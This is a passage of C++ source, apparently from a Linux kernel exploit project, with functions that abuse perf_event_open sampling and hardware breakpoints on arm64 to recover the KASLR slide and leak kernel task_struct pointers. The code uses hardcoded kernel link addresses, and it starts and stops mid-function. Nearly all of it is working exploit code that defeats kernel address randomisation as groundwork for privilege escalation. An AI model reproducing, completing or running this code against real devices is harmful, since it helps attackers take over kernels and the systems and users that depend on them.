        char *base = reinterpret_cast<char *>(buf.data()) + kPerfPageSize;
        uint64_t pos = hdr->data_tail;
        constexpr int32_t kRegs = 32;
        static const char *const kRegName[kRegs] = {
            "x00", "x01", "x02", "x03", "x04", "x05", "x06", "x07",
            "x08", "x09", "x10", "x11", "x12", "x13", "x14", "x15",
            "x16", "x17", "x18", "x19", "x20", "x21", "x22", "x23",
            "x24", "x25", "x26", "x27", "x28", "x29", "x30", "sp "};
        /* __task_pid_nr_ns(struct task_struct *tsk, ...) — first argument is
         * `current`, so x0 at any PC inside it is exactly the pointer we want. */
        std::array<std::array<uintptr_t, 3>, kRegs> topv{};
        std::array<std::array<int32_t, 3>, kRegs> topc{};
        int64_t samples = 0;
        int32_t dump = 0;
        int64_t ip_total = 0;
        constexpr int32_t kNip = 32;
        uint64_t ipv[kNip] = {};
        int32_t ipc[kNip] = {};

        /* Slide recovery.  The image is mapped at a random virtual base, so the
         * sampled IPs are far away from their link-time addresses.  Two
         * byte-exact instruction sequences in the image give a fixed anchor:
         *   _raw_write_lock+0x18      (the wfe/ldaxr spin of the ticket lock)
         *   _raw_write_lock_irq+0x1c  (0x78 further on, same shape)
         * Either one can be the hot spot, so both candidate slides are tried
         * and the one that puts the samples inside __schedule() wins. */
        constexpr uint64_t kSpinWfeVa = 0xffffff8009a898b0ULL;
        constexpr uint64_t kSpinWfeIrqVa = 0xffffff8009a89928ULL;
        const uint64_t kSchedBody = 0xffffff8009a828f0ULL + (target::address::kImageTextBaseRuntime - 0xffffff8008080000ULL);
        constexpr uint64_t kSchedBodyLen = 0x1800ULL;
        uint64_t sched_lo = 0;
        uint64_t sched_hi = 0;
        {
            uint64_t pass1[kNip] = {};
            int32_t pass1c[kNip] = {};
            uint64_t scan = pos;
            while (scan < head) {
                auto *ev = reinterpret_cast<struct perf_event_header *>(
                    base + (scan % kPerfDataSize));
                if (ev->size == 0) break;
                if (ev->type == PERF_RECORD_SAMPLE) {
                    const uint64_t ip = *reinterpret_cast<uint64_t *>(
                        reinterpret_cast<char *>(ev) + sizeof(*ev));
                    for (int32_t k = 0; k < kNip; k++) {
                        if (pass1c[k] && pass1[k] == ip) { pass1c[k]++; break; }
                        if (!pass1c[k]) { pass1[k] = ip; pass1c[k] = 1; break; }
                    }
                }
                scan += ev->size;
            }
            int32_t hot = 0;
            for (int32_t k = 1; k < kNip; k++) if (pass1c[k] > pass1c[hot]) hot = k;
            const uint64_t hot_ip = pass1c[hot] ? pass1[kNip > 0 ? hot : 0] : 0;
            const uint64_t cand[2] = {
                hot_ip > kSpinWfeVa ? hot_ip - kSpinWfeVa : 0,
                hot_ip > kSpinWfeIrqVa ? hot_ip - kSpinWfeIrqVa : 0,
            };
            int32_t best_hits = -1;
            for (int32_t c = 0; c < 2; c++) {
                if (!cand[c]) continue;
                const uint64_t lo = kSchedBody + cand[c];
                int32_t hits = 0;
                for (int32_t k = 0; k < kNip; k++) {
                    if (!pass1c[k]) continue;
                    if (pass1[k] >= lo && pass1[k] < lo + kSchedBodyLen) hits++;
                }
                if (hits > best_hits) {
                    best_hits = hits;
                    sched_lo = lo;
                    sched_hi = lo + kSchedBodyLen;
                }
            }
            pr_info("[dbg] hot ip=%016zx x%d slide-candidates=%016zx/%016zx sched-hits=%d\n",
                    (size_t) hot_ip, pass1c[hot], (size_t) cand[0], (size_t) cand[1],
                    best_hits);
        }
        while (pos < head) {
            auto *ev = reinterpret_cast<struct perf_event_header *>(base + (pos % kPerfDataSize));
            if (ev->size == 0) break;
            if (ev->type == PERF_RECORD_SAMPLE) {
                char *p = reinterpret_cast<char *>(ev) + sizeof(*ev);
                if (dump < 2) {
                    dump++;
                    char hex[3 * 64 + 1];
                    int32_t hn = 0;
                    for (int32_t b = 0; b < 48; b++) {
                        const unsigned char c = static_cast<unsigned char>(p[b]);
                        hex[hn++] = "0123456789abcdef"[c >> 4];
                        hex[hn++] = "0123456789abcdef"[c & 0xf];
                        hex[hn++] = ' ';
                    }
                    hex[hn] = 0;
                    pr_info("[dbg] raw ev->size=%u %s\n", (unsigned)ev->size, hex);
                }
                const uint64_t ip = *reinterpret_cast<uint64_t *>(p);
                p += 8; /* IP */
                const uint64_t abi = *reinterpret_cast<uint64_t *>(p);
                p += 8;
                {
                    ip_total++;
                    int32_t hit = -1;
                    for (int32_t k = 0; k < kNip; k++) if (ipc[k] && ipv[k] == ip) { hit = k; break; }
                    if (hit >= 0) ipc[hit]++;
                    else for (int32_t k = 0; k < kNip; k++) if (!ipc[k]) { ipv[k] = ip; ipc[k] = 1; break; }
                }
                if (!getenv("GHOSTLOCK_PERF_ALL") && (!sched_lo || ip < sched_lo || ip >= sched_hi)) {
                    pos += ev->size;
                    continue;
                }
                if (abi == 1 || abi == 2) {
                    const uint64_t *regs = reinterpret_cast<const uint64_t *>(p);
                    samples++;
                    for (int32_t i = 0; i < kRegs; i++) {
                        const uint64_t v = (regs[i] & 0x0000ffffffffffffULL) | 0xffff000000000000ULL;
                        if ((v & 7ULL) != 0 || !in_direct_map(v)) continue;
                        auto &vs = topv[static_cast<size_t>(i)];
                        auto &cs = topc[static_cast<size_t>(i)];
                        int32_t slot = -1;
                        for (int32_t k = 0; k < 3; k++) if (cs[k] && vs[k] == v) slot = k;
                        if (slot < 0) {
                            slot = 0;
                            for (int32_t k = 1; k < 3; k++) if (cs[k] < cs[slot]) slot = k;
                            if (cs[slot] == 0 || true) { vs[slot] = v; cs[slot] = 0; }
                        }
                        cs[slot]++;
                    }
                }
            }
            pos += ev->size;
        }
        hdr->data_tail = head;
        pr_info("[dbg] sleeping samples=%lld ips=%lld\n",
                static_cast<long long>(samples), static_cast<long long>(ip_total));
        for (int32_t k = 0; k < kNip; k++)
            if (ipc[k]) pr_info("[dbg] ip %016zx x%d\n", (size_t)ipv[k], ipc[k]);
        uintptr_t best = 0;
        int32_t bestc = 0;
        for (int32_t i = 0; i < kRegs; i++)
            for (int32_t k = 0; k < 3; k++)
                if (topc[static_cast<size_t>(i)][static_cast<size_t>(k)])
                    pr_info("[dbg] %s #%d %016zx x%d\n", kRegName[i], k,
                            (size_t)topv[static_cast<size_t>(i)][static_cast<size_t>(k)],
                            topc[static_cast<size_t>(i)][static_cast<size_t>(k)]);
        if (topc[0][0] > bestc) { bestc = topc[0][0]; best = topv[0][0]; }
        if (sched_lo) g_kernel_slide = sched_lo - kSchedBody;
        return bestc >= 3 ? best : 0;
    }

    /* Phase 2: the child spins in getpid(), so the hot sample lands in
     * __task_pid_nr_ns(), whose first argument is `current`.  Requires the
     * slide recovered by phase 1. */
    uintptr_t perf_task_from_pid_ns(void) {
        constexpr uint64_t kSpinWfeVa = 0xffffff8009a898b0ULL;
        constexpr uint64_t kSpinWfeIrqVa = 0xffffff8009a89928ULL;
        const uint64_t kSwitchLink = 0xffffff80082862e8ULL + (target::address::kImageTextBaseRuntime - 0xffffff8008080000ULL);
        constexpr uint64_t kSwitchLen = 0x200ULL;

        int32_t pipefd[2];
        if (pipe(pipefd) != 0) return 0;
        const pid_t child = fork();
        if (child < 0) { close(pipefd[0]); close(pipefd[1]); return 0; }
        if (child == 0) {
            close(pipefd[0]);
            const pid_t tid = static_cast<pid_t>(syscall(__NR_gettid));
            ssize_t ignored = write(pipefd[1], &tid, sizeof(tid));
            (void) ignored;
            close(pipefd[1]);
            /* getpid() is the point: its `mrs x0, sp_el0; bl __task_pid_nr_ns`
             * leaves current in x0 at every sample inside the callee.  Yield
             * every so often so a tight loop cannot starve this process. */
            for (uint32_t i = 0;; i++) {
                syscall(__NR_getpid);
                if ((i & 0x3ff) == 0) syscall(__NR_sched_yield);
            }
        }
        close(pipefd[1]);
        pid_t tid = 0;
        if (read(pipefd[0], &tid, sizeof(tid)) != static_cast<ssize_t>(sizeof(tid)) || tid <= 0) {
            close(pipefd[0]); kill(child, SIGKILL); return 0;
        }
        close(pipefd[0]);

        struct perf_event_attr pe{};
        pe.type = PERF_TYPE_SOFTWARE;
        pe.size = sizeof(pe);
        pe.config = PERF_COUNT_SW_CPU_CLOCK;
        pe.sample_period = 2000;
        pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
        pe.sample_regs_intr = (1ULL << 32) - 1;
        pe.disabled = 1;
        pe.exclude_user = 1;
        pe.exclude_hv = 1;
        pe.exclude_idle = 1;
        errno = 0;
        support::UniqueFd fd(static_cast<int32_t>(
            syscall(__NR_perf_event_open, &pe, tid, -1, -1, 0)));
        if (!fd.valid()) { kill(child, SIGKILL); return 0; }
        constexpr size_t kPage = 4096;
        constexpr size_t kSize = kPage * 64;
        void *mapped = mmap(nullptr, kPage + kSize, PROT_READ | PROT_WRITE, MAP_SHARED, fd.get(), 0);
        if (mapped == MAP_FAILED) { kill(child, SIGKILL); return 0; }
        support::MappedRegion buf(mapped, kPage + kSize);
        ioctl(fd.get(), PERF_EVENT_IOC_ENABLE, 0);
        struct timespec nap = {.tv_sec = 0, .tv_nsec = 400000000};
        syscall(__NR_nanosleep, &nap, nullptr);
        ioctl(fd.get(), PERF_EVENT_IOC_DISABLE, 0);
        kill(child, SIGKILL);
        waitpid(child, nullptr, 0);

        auto *hdr = static_cast<struct perf_event_mmap_page *>(buf.data());
        const uint64_t head = hdr->data_head;
        std::atomic_thread_fence(std::memory_order_acquire);
        char *base = reinterpret_cast<char *>(buf.data()) + kPage;
        const uint64_t pos = hdr->data_tail;

        /* pass 1: where do the samples land?  The dominant one is the ticket
         * lock spin; its two known link addresses give the slide. */
        uint64_t hot_ip = 0;
        int32_t hot_n = 0;
        {
            uint64_t ips[16] = {};
            int32_t cnts[16] = {};
            uint64_t scan = pos;
            while (scan < head) {
                auto *ev = reinterpret_cast<struct perf_event_header *>(base + (scan % kSize));
                if (ev->size == 0) break;
                if (ev->type == PERF_RECORD_SAMPLE) {
                    const uint64_t ip = *reinterpret_cast<uint64_t *>(
                        reinterpret_cast<char *>(ev) + sizeof(*ev));
                    for (int32_t k = 0; k < 16; k++) {
                        if (cnts[k] && ips[k] == ip) { cnts[k]++; break; }
                        if (!cnts[k]) { ips[k] = ip; cnts[k] = 1; break; }
                    }
                }
                scan += ev->size;
            }
            for (int32_t k = 0; k < 16; k++) if (cnts[k] > hot_n) { hot_n = cnts[k]; hot_ip = ips[k]; }
        }
        const uint64_t cand[2] = {
            hot_ip > kSpinWfeVa ? hot_ip - kSpinWfeVa : 0,
            hot_ip > kSpinWfeIrqVa ? hot_ip - kSpinWfeIrqVa : 0,
        };
        pr_info("[dbg] switch hot=%016zx x%d cand=%016zx/%016zx\n",
                (size_t) hot_ip, hot_n, (size_t) cand[0], (size_t) cand[1]);

        for (int32_t c = 0; c < 2; c++) {
            if (!cand[c]) continue;
            const uint64_t lo = kSwitchLink + cand[c];
            const uint64_t hi = lo + kSwitchLen;
            uintptr_t top[4] = {};
            int32_t topc[4] = {};
            int64_t in_range = 0;
            uint64_t scan = pos;
            while (scan < head) {
                auto *ev = reinterpret_cast<struct perf_event_header *>(base + (scan % kSize));
                if (ev->size == 0) break;
                if (ev->type == PERF_RECORD_SAMPLE) {
                    char *q = reinterpret_cast<char *>(ev) + sizeof(*ev);
                    const uint64_t ip = *reinterpret_cast<uint64_t *>(q);
                    q += 8;
                    const uint64_t abi = *reinterpret_cast<uint64_t *>(q);
                    q += 8;
                    if (ip >= lo && ip < hi && (abi == 1 || abi == 2)) {
                        const uint64_t *regs = reinterpret_cast<const uint64_t *>(q);
                        const uint64_t v = (regs[0] & 0x0000ffffffffffffULL) | 0xffff000000000000ULL;
                        if ((v & 0xfULL) == 0 && in_direct_map(v)) {
                            in_range++;
                            int32_t slot = -1;
                            for (int32_t k = 0; k < 4; k++) if (topc[k] && top[k] == v) slot = k;
                            if (slot < 0) {
                                slot = 0;
                                for (int32_t k = 1; k < 4; k++) if (topc[k] < topc[slot]) slot = k;
                                top[slot] = v; topc[slot] = 0;
                            }
                            topc[slot]++;
                        }
                    }
                }
                scan += ev->size;
            }
            pr_info("[dbg] switch cand%d samples=%lld\n", c, static_cast<long long>(in_range));
            for (int32_t k = 0; k < 4; k++)
                if (topc[k]) pr_info("[dbg] switch cand%d x0 %016zx x%d\n", c, (size_t) top[k], topc[k]);
            int32_t best = 0;
            for (int32_t k = 1; k < 4; k++) if (topc[k] > topc[best]) best = k;
            if (topc[best] >= 3 && in_range > 0) {
                g_kernel_slide = cand[c];
                return top[best];
            }
        }
        hdr->data_tail = head;
        return 0;
    }

    /* Recover the KASLR slide for this boot by sampling our own thread while it
     * spins in a syscall: the dominant PC is the ticket-lock wfe spin, whose
     * link address is a known constant, so slide = hot_ip - anchor.  A second
     * candidate anchor (the _irq variant, 0x78 further on) is disambiguated by
     * checking which one puts the remaining samples inside __schedule(). */
    uint64_t recover_image_base_self(void) {
        constexpr uint64_t kSpinWfeVa = 0xffffff8009a898b0ULL;
        constexpr uint64_t kSpinWfeIrqVa = 0xffffff8009a89928ULL;
        constexpr uint64_t kTextLo = 0xffffff8008081000ULL;
        constexpr uint64_t kTextHi = 0xffffff800b400000ULL;
        const uint64_t kSchedBody = 0xffffff8009a828f0ULL + (target::address::kImageTextBaseRuntime - 0xffffff8008080000ULL);
        constexpr uint64_t kSchedLen = 0x1800ULL;

        struct perf_event_attr pe{};
        pe.type = PERF_TYPE_SOFTWARE;
        pe.size = sizeof(pe);
        pe.config = PERF_COUNT_SW_CPU_CLOCK;
        pe.sample_period = 2000;
        pe.sample_type = PERF_SAMPLE_IP;
        pe.disabled = 1;
        pe.exclude_user = 1;
        pe.exclude_hv = 1;
        errno = 0;
        support::UniqueFd fd(static_cast<int32_t>(
            syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0)));
        if (!fd.valid()) {
            pr_warning("slide: perf_event_open(self) failed errno=%d\n", errno);
            return 0;
        }
        constexpr size_t kPage = 4096;
        constexpr size_t kSize = kPage * 64;
        void *mapped = mmap(nullptr, kPage + kSize, PROT_READ | PROT_WRITE, MAP_SHARED, fd.get(), 0);
        if (mapped == MAP_FAILED) return 0;
        support::MappedRegion buf(mapped, kPage + kSize);
        ioctl(fd.get(), PERF_EVENT_IOC_ENABLE, 0);
        const uint64_t deadline_ns = 200000000ULL;
        struct timespec t0{};
        syscall(__NR_clock_gettime, CLOCK_MONOTONIC, &t0);
        for (;;) {
            syscall(__NR_sched_yield);
            struct timespec now{};
            syscall(__NR_clock_gettime, CLOCK_MONOTONIC, &now);
            const uint64_t dt = (uint64_t)(now.tv_sec - t0.tv_sec) * 1000000000ULL +
                                (uint64_t)(now.tv_nsec - t0.tv_nsec);
            if (dt >= deadline_ns) break;
        }
        ioctl(fd.get(), PERF_EVENT_IOC_DISABLE, 0);

        auto *hdr = static_cast<struct perf_event_mmap_page *>(buf.data());
        const uint64_t head = hdr->data_head;
        std::atomic_thread_fence(std::memory_order_acquire);
        char *base = reinterpret_cast<char *>(buf.data()) + kPage;
        uint64_t pos = hdr->data_tail;
        constexpr int32_t kN = 24;
        uint64_t ips[kN] = {};
        int32_t cnt[kN] = {};
        while (pos < head) {
            auto *ev = reinterpret_cast<struct perf_event_header *>(base + (pos % kSize));
            if (ev->size == 0) break;
            if (ev->type == PERF_RECORD_SAMPLE) {
                const uint64_t ip = *reinterpret_cast<uint64_t *>(
                    reinterpret_cast<char *>(ev) + sizeof(*ev));
                for (int32_t k = 0; k < kN; k++) {
                    if (cnt[k] && ips[k] == ip) { cnt[k]++; break; }
                    if (!cnt[k]) { ips[k] = ip; cnt[k] = 1; break; }
                }
            }
            pos += ev->size;
        }
        hdr->data_tail = head;
        int32_t hot = 0;
        for (int32_t k = 1; k < kN; k++) if (cnt[k] > cnt[hot]) hot = k;
        if (!cnt[hot]) return 0;
        const uint64_t hot_ip = ips[hot];
        for (int32_t k = 0; k < kN && k < 6; k++)
            if (cnt[k])
                pr_info("[dbg] self ip[%d]=%016llx x%d\n", k,
                        (unsigned long long) ips[k], cnt[k]);
        const uint64_t cand[2] = {hot_ip - kSpinWfeVa, hot_ip - kSpinWfeIrqVa};
        int32_t best_hits = -1;
        uint64_t chosen = 0;
        for (int32_t c = 0; c < 2; c++) {
            const uint64_t lo = kSchedBody + cand[c];
            int32_t hits = 0;
            for (int32_t k = 0; k < kN; k++)
                if (cnt[k] && ips[k] >= lo && ips[k] < lo + kSchedLen) hits++;
            if (hits > best_hits) { best_hits = hits; chosen = cand[c]; }
        }
        /* KASLR moves the image anywhere inside the 39-bit kernel VA window, so
         * the only structural checks available here are the direct-map bounds
         * and the requirement that the disambiguation found __schedule. */
        const uint64_t runtime_base = kTextLo + chosen;
        /* ARM64 head.S places _text at image_start + text_offset(0x80000) and
         * kaslr aligns the image itself to 1 MiB, so a genuine text base always
         * ends in 0x80000. This rejects anchor misses that still happen to hit
         * __schedule by luck. */
        const bool aligned = (runtime_base & 0xfffffULL) == 0x80000ULL;
        /* VA_BITS=39: the kernel half spans 0xffffff8000000000.., and KASLR may
         * place the image anywhere inside it (observed up to 0xffffff9d...). */
        if (best_hits <= 0 || !aligned || runtime_base < 0xffffff8000000000ULL ||
            runtime_base > 0xfffffffffffff000ULL) {
            pr_warning("slide: implausible base %016llx hits=%d\n",
                       (unsigned long long) runtime_base, best_hits);
            return 0;
        }
        target::address::set_image_text_base(runtime_base);
        pr_success("slide: hot=%016llx x%d base=%016llx slide=%016llx sched_hits=%d\n",
                   (unsigned long long) hot_ip, cnt[hot],
                   (unsigned long long) runtime_base, (unsigned long long) chosen, best_hits);
        return runtime_base;
    }


    /* Probe __switch_to: it is the only kernel function that receives the task
     * pointer explicitly (x0 = prev, x1 = next), so it does not depend on the
     * sp_el0 trick that perf cannot sample on arm64 4.14. */
    uintptr_t perf_task_switch_probe(void) {
        const uint64_t slide = target::address::kImageTextBaseRuntime - 0xffffff8008080000ULL;
        const uint64_t kSwitchTo = 0xffffff80082132b4ULL + slide;
        constexpr uint64_t kSwitchToLen = 0x140ULL;
        constexpr uint64_t kRegs = 6;

        int32_t pipefd[2];
        if (pipe(pipefd) != 0) return 0;
        const pid_t child = fork();
        if (child < 0) { close(pipefd[0]); close(pipefd[1]); return 0; }
        if (child == 0) {
            close(pipefd[0]);
            const pid_t tid = static_cast<pid_t>(syscall(__NR_gettid));
            ssize_t ignored = write(pipefd[1], &tid, sizeof(tid));
            (void) ignored;
            close(pipefd[1]);
            for (;;) {
                struct timespec ts = {.tv_sec = 0, .tv_nsec = 200000};
                syscall(__NR_nanosleep, &ts, nullptr);
            }
        }
        close(pipefd[1]);
        pid_t tid = 0;
        if (read(pipefd[0], &tid, sizeof(tid)) != static_cast<ssize_t>(sizeof(tid)) || tid <= 0) {
            close(pipefd[0]); kill(child, SIGKILL); return 0;
        }
        close(pipefd[0]);

        struct perf_event_attr pe{};
        pe.type = PERF_TYPE_SOFTWARE;
        pe.size = sizeof(pe);
        pe.config = PERF_COUNT_SW_CPU_CLOCK;
        pe.sample_period = 1000;
        pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
        pe.sample_regs_intr = (1ULL << kRegs) - 1;
        pe.disabled = 1;
        pe.exclude_user = 1;
        pe.exclude_hv = 1;
        pe.exclude_idle = 1;
        support::UniqueFd fd(static_cast<int32_t>(
            syscall(__NR_perf_event_open, &pe, tid, -1, -1, 0)));
        if (!fd.valid()) { kill(child, SIGKILL); return 0; }
        constexpr size_t kPage = 4096;
        constexpr size_t kSize = kPage * 64;
        void *mapped = mmap(nullptr, kPage + kSize, PROT_READ | PROT_WRITE, MAP_SHARED, fd.get(), 0);
        if (mapped == MAP_FAILED) { kill(child, SIGKILL); return 0; }
        support::MappedRegion buf(mapped, kPage + kSize);
        ioctl(fd.get(), PERF_EVENT_IOC_ENABLE, 0);
        struct timespec nap = {.tv_sec = 0, .tv_nsec = 500000000};
        syscall(__NR_nanosleep, &nap, nullptr);
        ioctl(fd.get(), PERF_EVENT_IOC_DISABLE, 0);
        kill(child, SIGKILL);
        waitpid(child, nullptr, 0);

        auto *hdr = static_cast<struct perf_event_mmap_page *>(buf.data());
        const uint64_t head = hdr->data_head;
        std::atomic_thread_fence(std::memory_order_acquire);
        char *base = reinterpret_cast<char *>(buf.data()) + kPage;
        const uint64_t pos = hdr->data_tail;
        const uint64_t lo = kSwitchTo;
        const uint64_t hi = kSwitchTo + kSwitchToLen;

        uintptr_t top[4] = {};
        int32_t topc[4] = {};
        uint64_t hips[6] = {};
        int32_t hcnt[6] = {};
        int64_t in_range = 0;
        int64_t total = 0;
        uint64_t scan = pos;
        while (scan < head) {
            auto *ev = reinterpret_cast<struct perf_event_header *>(base + (scan % kSize));
            if (ev->size == 0) break;
            if (ev->type == PERF_RECORD_SAMPLE) {
                char *q = reinterpret_cast<char *>(ev) + sizeof(*ev);
                const uint64_t ip = *reinterpret_cast<uint64_t *>(q);
                q += 8;
                const uint64_t abi = *reinterpret_cast<uint64_t *>(q);
                q += 8;
                total++;
                for (int32_t k = 0; k < 6; k++) {
                    if (hcnt[k] && hips[k] == ip) { hcnt[k]++; break; }
                    if (!hcnt[k]) { hips[k] = ip; hcnt[k] = 1; break; }
                }
                if (ip >= lo && ip < hi && (abi == 1 || abi == 2)) {
                    in_range++;
                    for (uint64_t r = 0; r < kRegs; r++) {
                        const uint64_t v = *reinterpret_cast<uint64_t *>(q + r * 8);
                        if (r != 0 && r != 1) continue;    /* x0 = prev, x1 = next */
                        const uintptr_t cand = static_cast<uintptr_t>(
                            (v & 0x0000ffffffffffffULL) | 0xffff000000000000ULL);
                        if (!cand || (cand & 7) != 0 || (cand & 0xfff) == 0) continue;
                        if (cand < 0xffffff8000000000ULL || cand >= 0xffffff9000000000ULL) continue;
                        for (int32_t k = 0; k < 4; k++) {
                            if (topc[k] && top[k] == cand) { topc[k]++; break; }
                            if (!topc[k]) { top[k] = cand; topc[k] = 1; break; }
                        }
                    }
                }
            }
            scan += ev->size;
        }
        pr_info("[dbg] switch samples=%ld in_range=%ld lo=%016llx hi=%016llx\n",
                (long) total, (long) in_range, (unsigned long long) lo, (unsigned long long) hi);
        for (int32_t k = 0; k < 6; k++) {
            if (hcnt[k]) pr_info("[dbg]   ip %016llx x%d\n",
                                 (unsigned long long) hips[k], hcnt[k]);
        }
        for (int32_t k = 0; k < 4; k++) {
            if (topc[k] >= 5 && top[k]) return top[k];
        }
        return 0;
    }


    /* Hardware execute breakpoint on __switch_to: fires exactly at function
     * entry, where x0 = prev and x1 = next, so no sp_el0 sampling is needed. */
    uintptr_t perf_task_breakpoint_probe(void) {
        constexpr uint32_t kPerfTypeBreakpoint = 5;
        constexpr uint32_t kHwBreakpointX = 4;
        constexpr uint64_t kHwLen8 = 8;

        const uint64_t slide = target::address::kImageTextBaseRuntime - 0xffffff8008080000ULL;
        const uint64_t switch_to = 0xffffff80082132b4ULL + slide;

        int32_t pipefd[2];
        if (pipe(pipefd) != 0) return 0;
        const pid_t child = fork();
        if (child < 0) { close(pipefd[0]); close(pipefd[1]); return 0; }
        if (child == 0) {
            close(pipefd[0]);
            const pid_t tid = static_cast<pid_t>(syscall(__NR_gettid));
            ssize_t ignored = write(pipefd[1], &tid, sizeof(tid));
            (void) ignored;
            close(pipefd[1]);
            for (;;) {
                struct timespec ts = {.tv_sec = 0, .tv_nsec = 300000};
                syscall(__NR_nanosleep, &ts, nullptr);
            }
        }
        close(pipefd[1]);
        pid_t tid = 0;
        if (read(pipefd[0], &tid, sizeof(tid)) != static_cast<ssize_t>(sizeof(tid)) || tid <= 0) {
            close(pipefd[0]); kill(child, SIGKILL); return 0;
        }
        close(pipefd[0]);

        struct perf_event_attr pe{};
        pe.type = kPerfTypeBreakpoint;
        pe.size = sizeof(pe);
        pe.bp_type = kHwBreakpointX;
        pe.bp_addr = switch_to;
        {
            const char *len_env = getenv("GHOSTLOCK_BP_LEN");
            pe.bp_len = len_env ? static_cast<uint64_t>(strtoul(len_env, nullptr, 0)) : kHwLen8;
        }
        pe.sample_period = 1;
        pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
        pe.sample_regs_intr = 0x3;      /* x0, x1 */
        pe.disabled = 1;
        pe.exclude_user = 1;
        pe.exclude_hv = 1;
        errno = 0;
        support::UniqueFd fd(static_cast<int32_t>(
            syscall(__NR_perf_event_open, &pe, tid, -1, -1, 0)));
        if (!fd.valid()) {
            pr_info("[dbg] bp open failed errno=%d\n", errno);
            kill(child, SIGKILL);
            return 0;
        }
        constexpr size_t kPage = 4096;
        constexpr size_t kSize = kPage * 16;
        void *mapped = mmap(nullptr, kPage + kSize, PROT_READ | PROT_WRITE, MAP_SHARED, fd.get(), 0);
        if (mapped == MAP_FAILED) { kill(child, SIGKILL); return 0; }
        support::MappedRegion buf(mapped, kPage + kSize);
        ioctl(fd.get(), PERF_EVENT_IOC_ENABLE, 0);
        struct timespec nap = {.tv_sec = 0, .tv_nsec = 400000000};
        syscall(__NR_nanosleep, &nap, nullptr);
        ioctl(fd.get(), PERF_EVENT_IOC_DISABLE, 0);
        kill(child, SIGKILL);
        waitpid(child, nullptr, 0);

        auto *hdr = static_cast<struct perf_event_mmap_page *>(buf.data());
        const uint64_t head = hdr->data_head;
        std::atomic_thread_fence(std::memory_order_acquire);
        char *base = reinterpret_cast<char *>(buf.data()) + kPage;
        uint64_t scan = hdr->data_tail;

        uintptr_t top[6] = {};
        int32_t topc[6] = {};
        int64_t total = 0;
        while (scan < head) {
            auto *ev = reinterpret_cast<struct perf_event_header *>(base + (scan % kSize));
            if (ev->size == 0) break;
            if (ev->type == PERF_RECORD_SAMPLE) {
                char *q = reinterpret_cast<char *>(ev) + sizeof(*ev);
                q += 8;                                  /* ip */
                const uint64_t abi = *reinterpret_cast<uint64_t *>(q);
                q += 8;
                total++;
                if (abi == 1 || abi == 2) {
                    for (uint64_t r = 0; r < 2; r++) {
                        const uint64_t v = *reinterpret_cast<uint64_t *>(q + r * 8);
                        const uintptr_t cand = static_cast<uintptr_t>(
                            (v & 0x0000ffffffffffffULL) | 0xffff000000000000ULL);
                        if (!cand || (cand & 7) != 0 || (cand & 0xfff) == 0) continue;
                        if (cand < 0xffffff8000000000ULL || cand >= 0xffffff9000000000ULL) continue;
                        for (int32_t k = 0; k < 6; k++) {
                            if (topc[k] && top[k] == cand) { topc[k]++; break; }
                            if (!topc[k]) { top[k] = cand; topc[k] = 1; break; }
                        }
                    }
                }
            }
            scan += ev->size;
        }
        pr_info("[dbg] bp samples=%ld switch_to=%016llx\n",
                (long) total, (unsigned long long) switch_to);
        for (int32_t k = 0; k < 6; k++) {
            if (topc[k]) pr_info("[dbg]   bp cand %016zx x%d\n", (size_t) top[k], topc[k]);
        }
        for (int32_t k = 0; k < 6; k++) if (topc[k] >= 3 && top[k]) return top[k];
        return 0;
    }


    /* Original design, now that the slide is known: the child spins in
     * getpid(), and getpid() is `mrs x0, sp_el0; bl __task_pid_nr_ns`, so any
     * sample whose IP lands inside __task_pid_nr_ns has x0 = current.  Vote
     * only on that register and require the winner to appear at several
     * distinct call sites (a kernel stack pointer only shows up near one). */
    uintptr_t perf_task_from_current_arg(void) {
        const uint64_t slide = target::address::kImageTextBaseRuntime - 0xffffff8008080000ULL;
        const uint64_t pid_ns = 0xffffff800826c10cULL + slide;
        constexpr uint64_t kPidNsLen = 0x400ULL;

        pr_info("[dbg] arg enter\n");
        int32_t pipefd[2];
        if (pipe(pipefd) != 0) return 0;
        const pid_t child = fork();
        if (child < 0) { close(pipefd[0]); close(pipefd[1]); return 0; }
        if (child == 0) {
            close(pipefd[0]);
            const pid_t tid = static_cast<pid_t>(syscall(__NR_gettid));
            ssize_t ignored = write(pipefd[1], &tid, sizeof(tid));
            (void) ignored;
            close(pipefd[1]);
            for (;;) syscall(__NR_sched_yield);
        }
        close(pipefd[1]);
        pid_t tid = 0;
        if (read(pipefd[0], &tid, sizeof(tid)) != static_cast<ssize_t>(sizeof(tid)) || tid <= 0) {
            close(pipefd[0]); kill(child, SIGKILL); return 0;
        }
        close(pipefd[0]);

        struct perf_event_attr pe{};
        pe.type = PERF_TYPE_SOFTWARE;
        pe.size = sizeof(pe);
        pe.config = PERF_COUNT_SW_CPU_CLOCK;
        {
            const char *per = getenv("GHOSTLOCK_ARG_PERIOD");
            pe.sample_period = per ? strtoull(per, nullptr, 0) : 2000ULL;
        }
        pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
        pe.sample_regs_intr = 0x1;      /* x0 only: smaller records, more samples */
        pe.disabled = 1;
        pe.exclude_user = 1;
        pe.exclude_hv = 1;
        pe.exclude_idle = 1;
        support::UniqueFd fd(static_cast<int32_t>(
            syscall(__NR_perf_event_open, &pe, tid, -1, -1, 0)));
        pr_info("[dbg] arg perf fd ok=%d\n", (int) fd.valid());
        if (!fd.valid()) { kill(child, SIGKILL); return 0; }
        constexpr size_t kPage = 4096;
        constexpr size_t kSize = kPage * 256;
        void *mapped = mmap(nullptr, kPage + kSize, PROT_READ | PROT_WRITE, MAP_SHARED, fd.get(), 0);
        if (mapped == MAP_FAILED) { kill(child, SIGKILL); return 0; }
        support::MappedRegion buf(mapped, kPage + kSize);
        ioctl(fd.get(), PERF_EVENT_IOC_ENABLE, 0);
        struct timespec nap = {.tv_sec = 0, .tv_nsec = 400000000};
        syscall(__NR_nanosleep, &nap, nullptr);
        ioctl(fd.get(), PERF_EVENT_IOC_DISABLE, 0);
        pr_info("[dbg] arg sampled, stopping child\n");
        kill(child, SIGKILL);
        waitpid(child, nullptr, 0);
        pr_info("[dbg] arg child reaped\n");

        auto *hdr = static_cast<struct perf_event_mmap_page *>(buf.data());
        const uint64_t head = hdr->data_head;
        std::atomic_thread_fence(std::memory_order_acquire);
        char *base = reinterpret_cast<char *>(buf.data()) + kPage;
        uint64_t scan = hdr->data_tail;

